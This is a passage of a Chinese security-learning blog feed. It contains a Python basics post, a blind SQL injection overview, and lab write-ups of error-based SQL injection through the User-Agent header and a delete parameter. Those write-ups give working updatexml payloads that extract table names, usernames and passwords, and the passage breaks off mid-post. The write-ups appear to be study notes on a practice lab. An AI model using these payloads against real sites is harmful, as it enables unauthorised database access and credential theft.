class="headerlink" title="6.总结"></a>6.总结</h4><p>&emsp;&emsp;布尔类型经过两天的理论和代码研究就告一段落了，主要是自己手打了一遍代码，对过程和相关是函数使用有了很大的了解，对于参考的链接而言，受益匪浅但是有些地方不敢苟同，比如我习惯在注入时注意url的符号变化，在源代码中，由于部分没有变换，其实是有些走不通的，还是自己多研究多动手写脚本的来得好（虽然很多现成的，但不一定适合的啦）。有一说一，手动不如脚本，嘿嘿。接下来就是时间注入了，这个其实也是比较简单的啦，淦就完了。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python日记（一）</title>
    <link href="/2022/08/17/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2022/08/17/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Python日记（一）"><a href="#Python日记（一）" class="headerlink" title="Python日记（一）"></a>Python日记（一）</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;尽管自己一直有在使用python写东西，但是一直没有系统化的学习和掌握，总觉得自己有一些遗漏，在web渗透里也经常需要使用到脚本，使用python编写会有很好的优势（C语言其实跑得更加快，但是没有python方便的啦，毕竟语言类型都不一样）。所以就重新开始稳固语言把。</p><p>（跟着b站的某个系列视频走了一遍，嘿嘿）</p><p>&emsp;&emsp;</p><h4 id="1-Python的特点"><a href="#1-Python的特点" class="headerlink" title="1.Python的特点"></a>1.Python的特点</h4><ul><li><p><strong>简单、易学、开源：</strong></p><p>&emsp;&emsp;在Python的社区中，我们可以自由发布不同的版本，阅读、修改源代码并应用于新的软件之中</p></li><li><p><strong>解释型：</strong></p><p>&emsp;&emsp;学过计算机的都知道，计算机的语言可以分为编译型和解释型语言，编译型语言编译一次后，脱离了编译器也能运行，并且运行效率高。，但是存在可移植性的问题，而Python作为解释型语言，拥有着跨平台性好，通过不同的解释器，将相同的源代码解释成不同平台下机器码的优点，Python解释器会将源代码转化为中间字节码形式，然后将其解释卫将其语言并执行</p></li><li><p><strong>可移植：</strong></p><p>&emsp;&emsp;Python解释器已经被移植在许多的平台上，所以很多时候Python程序无需修改就可以在多个平台上运行，他的可移植强</p></li><li><p><strong>代码规范：</strong></p><p>&emsp;&emsp;Python所采用的强制缩进的方式，所以看其语言时是比较舒服的（C语言等用的是括号进行分别）</p></li></ul><p>&emsp;</p><h4 id="2-Hello-Word"><a href="#2-Hello-Word" class="headerlink" title="2.Hello Word"></a>2.Hello Word</h4><p>&emsp;&emsp;既然都学计算机语言了，总得会“Hello Word”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">liaoyue = <span class="hljs-string">&#x27;Hello Word&#x27;</span><br><span class="hljs-built_in">print</span>(liaoyue)<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/1.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;好了，接下来就正式开始相关内容把。</p><p>&emsp;</p><h4 id="3-标识符"><a href="#3-标识符" class="headerlink" title="3.标识符"></a>3.标识符</h4><p>&emsp;&emsp;在Python语言中，其对标识符的设置是有一定要求和限制的：</p><ul><li><p><strong>区分大小写：</strong></p><p>&emsp;&emsp;LIAOyue和liaoyue是两个完全不同的变量</p></li><li><p><strong>字符限制：</strong></p><p>&emsp;&emsp;首字符可以是下划线（_）或者字母，但是不能为数字，但除了首字符外的其他字符必须是下划线、字母和数字</p></li><li><p><strong>关键字：</strong></p><p>&emsp;&emsp;关键字不能作为标识符</p></li><li><p><strong>内置函数：</strong></p><p>&emsp;&emsp;不能使用Python的内置函数作为自己的标识符</p></li></ul><p>&emsp;</p><h4 id="4-关键字"><a href="#4-关键字" class="headerlink" title="4.关键字"></a>4.关键字</h4><table><thead><tr><th align="center">False</th><th align="center">def</th><th align="center">if</th><th align="center">raise</th><th align="center">None</th><th align="center">del</th><th align="center">import</th><th align="center">return</th><th align="center">True</th><th align="center">elif</th><th align="center">in</th></tr></thead><tbody><tr><td align="center">try</td><td align="center">and</td><td align="center">else</td><td align="center">is</td><td align="center">while</td><td align="center">as</td><td align="center">except</td><td align="center">lambda</td><td align="center">with</td><td align="center">assert</td><td align="center">finally</td></tr><tr><td align="center">nonlocal</td><td align="center">yield</td><td align="center">break</td><td align="center">for</td><td align="center">not</td><td align="center">class</td><td align="center">from</td><td align="center">or</td><td align="center">continue</td><td align="center">global</td><td align="center">pass</td></tr></tbody></table><p>&emsp;</p><h4 id="5-变量"><a href="#5-变量" class="headerlink" title="5.变量"></a>5.变量</h4><p>&emsp;&emsp;在Python中，为一个变量赋值的同时就声明了该变量，该变量的数据类型就是赋值数据所属的类型，该变量还可以接受其他类型的数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-            # 为了能运行中文的注释</span><br><br><span class="hljs-keyword">from</span> pickle <span class="hljs-keyword">import</span> TRUE<br><br>liaoyue1 = <span class="hljs-string">&#x27;Hello Word&#x27;</span>   <span class="hljs-comment">#  字符型</span><br><span class="hljs-built_in">print</span>(liaoyue1)<br><br>liaoyue2 = <span class="hljs-number">12.0</span>       <span class="hljs-comment">#  浮点型</span><br><span class="hljs-built_in">print</span>(liaoyue2)<br><br>liaoyue3 = <span class="hljs-number">12</span>        <span class="hljs-comment">#  整数型</span><br><span class="hljs-built_in">print</span>(liaoyue3)<br><br>liaoyue3 = <span class="hljs-literal">True</span>       <span class="hljs-comment">#  转化为布尔型（动态类型语言的特点）</span><br><span class="hljs-built_in">print</span>(liaoyue3)<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/2.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-语句"><a href="#6-语句" class="headerlink" title="6.语句"></a>6.语句</h4><p>&emsp;&emsp;对于Python而言，一行代码表示一个语句，在一般情况下语句结束时不加分号（也就是说可以加入分号也可以不加分号，但是为了整体的美观，不加分号是最舒服的）</p><p>\</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-            # 为了能运行中文的注释</span><br><br><span class="hljs-keyword">from</span> pickle <span class="hljs-keyword">import</span> TRUE<br><br>liaoyue1 = <span class="hljs-string">&#x27;Hello Word&#x27;</span>;   <span class="hljs-comment">#  字符型</span><br><span class="hljs-built_in">print</span>(liaoyue1);<br><br>liaoyue2 = <span class="hljs-number">12.0</span>;        <span class="hljs-comment">#  浮点型</span><br><span class="hljs-built_in">print</span>(liaoyue2);<br><br>liaoyue3 = <span class="hljs-number">12</span>;          <span class="hljs-comment">#  整数型</span><br><span class="hljs-built_in">print</span>(liaoyue3);<br><br>liaoyue3 = <span class="hljs-literal">True</span> ;       <span class="hljs-comment">#  转化为布尔型（动态类型语言）</span><br><span class="hljs-built_in">print</span>(liaoyue3);<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/3.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-代码注释"><a href="#7-代码注释" class="headerlink" title="7.代码注释"></a>7.代码注释</h4><p>&emsp;&emsp;与C语言不同的是，在C语言中使用的是//进行注释，而在Python使用的是#进行注释.而如果在代码的第一行使用以下的任意一个注释语句:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;这两个注释语句是等价的，他是告诉Python解释器该文件的编码集是UTF-8，可以避免产生代码中有中文等亚洲文字时无法解释文件的情况，一般尔雅你，改代码需要被放在文件的第一行或者第二行才会有效。</p><p>&emsp;</p><h4 id="8-模块"><a href="#8-模块" class="headerlink" title="8.模块"></a>8.模块</h4><p>&emsp;&emsp;在python语言中，对于模块的定义即是文件，导入语句有以下三种模式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> &lt;模块名&gt;<br><span class="hljs-keyword">from</span> &lt;模块名&gt; <span class="hljs-keyword">import</span> &lt;代码元素&gt;<br><span class="hljs-keyword">from</span> &lt;模块名&gt; <span class="hljs-keyword">import</span> &lt;代码元素&gt; <span class="hljs-keyword">as</span> &lt;代码元素别名&gt;<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;通过上面的图片（来源于《看漫画学python》）解释我们可以很清楚的了解模块的作用的本质是是一种索引的方式罢了。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——盲注</title>
    <link href="/2022/08/16/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/"/>
    <url>/2022/08/16/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——盲注"><a href="#SQL注入——盲注" class="headerlink" title="SQL注入——盲注"></a>SQL注入——盲注</h1><h4 id="1-盲注概述"><a href="#1-盲注概述" class="headerlink" title="1.盲注概述"></a>1.盲注概述</h4><p>&emsp;&emsp;在SQL的注入中，并不是所有的注入都能像联合查询注入和报错注入那样子获得回显信息的，有时候，在SQL语句执行完查询后，查询数据并不能回显到页面，当中，这个时候就需要用一些特殊的方法来判断或者尝试，这个过程称之为盲注。</p><p>&emsp;&emsp;如果数据库运行反馈的结果反馈出的内容是对错等相类似的逻辑信息，那我们就可以根据逻辑信息的变化来获取我们想要的内容。</p><p>&emsp;</p><h4 id="2-盲注的分类"><a href="#2-盲注的分类" class="headerlink" title="2.盲注的分类"></a>2.盲注的分类</h4><ul><li><p>&emsp;&emsp;布尔类型：</p><p>&emsp;&emsp;布尔型是计算机里的一种数据类型，只有True和False两个值，一般也称为逻辑型。布尔类型顾名思义就是反馈的信息只存在Ture和Fales，不论注入的内容是什么，他都只会返回正确或者错误</p></li><li><p>&emsp;&emsp;时间类型：</p><p>&emsp;&emsp;时间类型的返回值只有Ture，返回的情况都会按照正确来处理，但是由于加入了特定的时间函数，所以可以通过web页面返回的时间来判断注入语句是否正确和成功</p></li></ul><p>&emsp;</p><h4 id="3-盲注的部分函数"><a href="#3-盲注的部分函数" class="headerlink" title="3.盲注的部分函数"></a>3.盲注的部分函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">#返回字符串的长度<br>Length（）<br>  <br>#截取字符串<br>Substr（）<br><br>#返回字符的ascii码<br>Ascii（）  <br> <br>#将程序挂起一段时间 n为n秒<br>sleep(n)<br><br>#判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句<br>if(expr1,expr2,expr3):<br></code></pre></td></tr></table></figure><ul><li>&emsp;&emsp;Length（）:</li></ul><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/1.jpg" style="zoom: 80%;" /></center><ul><li>&emsp;&emsp;Substr（）:</li></ul><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/2.jpg" style="zoom: 80%;" /></center><ul><li>&emsp;&emsp;Ascii（） :</li></ul><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/3.jpg" style="zoom: 67%;" /></center><ul><li>&emsp;&emsp;sleep(n):</li></ul><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/4.jpg" style="zoom: 80%;" /></center><ul><li><p>&emsp;&emsp;if(expr1,expr2,expr3):</p><ul><li>错误情况：</li></ul></li></ul>  <center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/5.jpg" style="zoom: 80%;" />  </center><ul><li>正确情况：</li></ul>  <center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/6.jpg" style="zoom: 80%;" />  </center>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据安全工作日记</title>
    <link href="/2022/08/15/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <url>/2022/08/15/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="工作日记"><a href="#工作日记" class="headerlink" title="工作日记"></a>工作日记</h1><p>&emsp;&emsp;有记，就是不给看，气不气！</p>]]></content>
    
    
    <categories>
      
      <category>实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>报错注入——HTTP头型</title>
    <link href="/2022/08/15/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/"/>
    <url>/2022/08/15/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="报错注入——HTTP头型"><a href="#报错注入——HTTP头型" class="headerlink" title="报错注入——HTTP头型"></a>报错注入——HTTP头型</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;由于后台开发人员有时为了能够验证客户端登录的相关信息（比如网页的Cookie值验证）或者通过HTTP头用相关函数（SERVER）获取客户端的一些信息（比如QQ的登录定位等）</p><p>&emsp;&emsp;由于HTTP所使用的函数语句存在变量传送至数据库当中并使用了SQL语句进行处理，从而导致了SQL注入有机可乘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#$_SERVER详解</span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>]       <span class="hljs-comment">//浏览器语言 </span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]               <span class="hljs-comment">//当前用户 IP</span><br><span class="hljs-comment">#其余的相关内容可以参考网站：https://www.cainiaoxueyuan.com/bc/9910.html</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;</p><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><p>&emsp;&emsp;登录界面与提示：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/1.png" style="zoom: 80%;" /></center><p>&emsp;&emsp;登录出现错误画面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/2.png" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="2-正确登录"><a href="#2-正确登录" class="headerlink" title="2.正确登录"></a>2.正确登录</h4><p>&emsp;&emsp;查看提示显示，给了我们登录的账号和密码，登入：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/3.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="3-报文分析3"><a href="#3-报文分析3" class="headerlink" title="3.报文分析3"></a>3.报文分析3</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/4.png" style="zoom: 80%;" /></center><p>&emsp;&emsp;在上面的内容中，我们可以看见，当登录成功后，反馈出了我们的ip地址、使用浏览器类型和相关的端口等信息，这明显涉及到了之前在请求注入类型中的http头类型，在反馈的浏览器类型中加入单引号查看是否存在注入点：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/5.jpg" style="zoom: 80%;" /></center><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Chrome/<span class="hljs-number">99.0</span>.<span class="hljs-number">4844.51</span> Safari/<span class="hljs-number">537.36</span> <span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;通过反馈的内容提示可以看见（have an error in your SQL syntax），这说明存在SQL注入的漏洞，由于没有回显位置，所以尝试采用报错注入。</p><h4 id="4-使用updatexml函数获取数据库名"><a href="#4-使用updatexml函数获取数据库名" class="headerlink" title="4.使用updatexml函数获取数据库名"></a>4.使用updatexml函数获取数据库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,database(),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/6.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;注入方式依旧是updatexml老方法</p><p>&emsp;&emsp;</p><h4 id="5-获取数据库表名"><a href="#5-获取数据库表名" class="headerlink" title="5.获取数据库表名"></a>5.获取数据库表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or(updatexml(0x7e,concat(0x7e,(select(group_concat(table_name)) from (information_schema.tables)where(table_schema)like(database())),0x7e),0x7e))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/7.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;经典不够长，继续使用substr，其实limit也能用（但是我懒得重新写语句了）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),32,31),0x7e),1)) or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/8.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="6-获取表"><a href="#6-获取表" class="headerlink" title="6.获取表"></a>6.获取表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;  or (updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>users<span class="hljs-string">&#x27;)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/9.jpg" style="zoom: 80%;" /></center><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>users<span class="hljs-string">&#x27;)),32,32),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/10.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="7-获取表中的内容"><a href="#7-获取表中的内容" class="headerlink" title="7.获取表中的内容"></a>7.获取表中的内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,(select(group_concat(username))from(users)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/11.jpg" style="zoom: 80%;" /></center><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,(select(group_concat(password))from(users)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="8-解码"><a href="#8-解码" class="headerlink" title="8.解码"></a>8.解码</h4><p>&emsp;&emsp;“MD5的码，请阅读SQL——数字型”</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/1.png" style="zoom:150%;" /></center><p>&emsp;</p><h4 id="9-总结"><a href="#9-总结" class="headerlink" title="9.总结"></a>9.总结</h4><p>&emsp;&emsp;对于报错注入的三种类型演示就结束 了，接下来将是布尔类型和时间类型的注入了，在报错注入的学习中，还是有疑问的，比如在HTTP头中，为什么注入语句在内容前面能够注入成功，在内容的后面反而提示数据类型错误，还没想明白，很多博客上只说能注入就没了，说和前面的报错注入一样，我觉得是肤浅的,对于不同的类型而言，肯定有新的东西和应该注意的地方</p><p>&emsp;&emsp;以及应该有注意到，在前面的update类型中，用or的注入不成功，用and却成功了，这在逻辑上我无法理解，但是总归是试出来了，看来还有很长的路要去走呀！</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>报错注入——delete型</title>
    <link href="/2022/08/14/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/"/>
    <url>/2022/08/14/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="报错注入——delete型"><a href="#报错注入——delete型" class="headerlink" title="报错注入——delete型"></a>报错注入——delete型</h1><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><p>&emsp;&emsp;登录界面:</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/1.jpg" style="zoom:67%;" /></center><p>&emsp;&emsp;很明显，并没有反馈的东西，我们尝试点击留言内容</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/2.jpg" style="zoom:67%;" /></center><p>&emsp;&emsp;当我们输入内容时，会直接传送到留言板中，也没有显示位置，但是留意有删除选项，查看是否为注入点</p><p>&emsp;</p><h4 id="2-点击删除"><a href="#2-点击删除" class="headerlink" title="2.点击删除"></a>2.点击删除</h4><p>&emsp;&emsp;删除后界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/3.jpg" style="zoom:67%;" /></center><p>&emsp;&emsp;可以看见“11”的内容被删除了，明显这就是在通过删除修改数据库内容，这是一个接入点，抓取报文进行尝试</p><p>&emsp;</p><h4 id="3-分析报文"><a href="#3-分析报文" class="headerlink" title="3.分析报文"></a>3.分析报文</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/4.jpg" style="zoom:67%;" /></center><p>&emsp;&emsp;在报文中存在传送id值，这明显是数字类型，所以后续不用加入单引号进行注入，首先尝试了一下联合注入，但由于没有回显位，所以是肯定不行的。（需要注意，这里是GET传送，所以要使用URL的编码格式！！！）</p><p>&emsp;</p><h4 id="4-使用updatexml函数获取数据库名"><a href="#4-使用updatexml函数获取数据库名" class="headerlink" title="4.使用updatexml函数获取数据库名"></a>4.使用updatexml函数获取数据库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/5.jpg" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="5-获取数据库表名"><a href="#5-获取数据库表名" class="headerlink" title="5.获取数据库表名"></a>5.获取数据库表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(database())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/6.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;有缺失，说明长度不够长，使用substr函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(database())),<span class="hljs-number">32</span>,<span class="hljs-number">31</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)) <br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/7.jpg" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="6-获取表"><a href="#6-获取表" class="headerlink" title="6.获取表"></a>6.获取表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/8.jpg" style="zoom:60%;" /></center><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">32</span>,<span class="hljs-number">32</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/9.jpg" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="7-获取表中的内容"><a href="#7-获取表中的内容" class="headerlink" title="7.获取表中的内容"></a>7.获取表中的内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 